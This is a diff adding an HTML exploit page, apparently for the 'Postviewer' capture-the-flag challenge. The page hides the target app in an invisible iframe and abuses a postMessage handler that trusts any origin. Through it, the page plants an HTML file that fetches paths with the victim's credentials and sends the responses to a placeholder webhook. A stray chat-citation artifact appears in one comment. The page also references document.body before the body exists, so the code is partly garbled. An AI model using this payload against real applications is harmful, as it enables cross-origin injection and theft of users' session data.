@@ -1,0 +1,70 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>Postviewer bot payload</title>
+
+<script>
+(async () => {
+  const TARGET = "https://vtqxgb9b-postviewer5.instancer.2025.ctfcompetition.com/";
+  const EXFIL  = "YOUR_WEBHOOK_URL_HERE";
+
+  // Invisible iframe to the target app (Files page listens to postMessage)
+  const f = document.createElement("iframe");
+  f.style.cssText = "width:1px;height:1px;opacity:0;position:absolute;left:-9999px;top:-9999px;";
+  f.src = TARGET;
+  document.body.appendChild(f);
+
+  // [a-z0-9]+ name => generateFileId() returns the name as ID (predictable)
+  const name = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+
+  // This HTML becomes a File inside the victim and runs when rendered.
+  const inner = `
+<!doctype html><meta charset="utf-8">
+<script>
+(async () => {
+  const exfil = ${JSON.stringify("YOUR_WEBHOOK_URL_HERE")};
+
+  async function send(tag, txt) {
+    try {
+      await fetch(exfil + "?tag=" + encodeURIComponent(tag) + "&data=" + encodeURIComponent(txt.slice(0, 2000)));
+    } catch (e) {}
+  }
+
+  async function tryPath(p) {
+    try {
+      const r = await fetch(p, { credentials: "include" });
+      const t = await r.text();
+      if (/CTF\\{|FLAG\\{|flag\\{|ctf\\{/i.test(t)) {
+        await send("FLAG@" + p, t);
+      } else {
+        // still send short interesting responses
+        if (t.length && t.length < 3000) await send("RESP@" + p, t);
+      }
+    } catch (e) {
+      await send("ERR@" + p, String(e));
+    }
+  }
+
+  // Common CTF flag locations
+  await tryPath("/flag");
+  await tryPath("/admin/flag");
+  await tryPath("/.well-known/flag");
+  await tryPath("/static/comments.png");
+})();
+<\/script>`;
+
+  const blob = new Blob([inner], { type: "text/html" });
+
+  f.addEventListener("load", () => {
+    // Vulnerable handler: accepts share messages from ANY origin. :contentReference[oaicite:2]{index=2}
+    f.contentWindow.postMessage(
+      { type: "share", files: [{ blob, name, cached: 1 }] },
+      "*"
+    );
+
+    // Optional: also exfil that we successfully sent the share
+    fetch(EXFIL + "?tag=sent-share");
+  });
+})();
+</script>
+
+<body>ok</body>
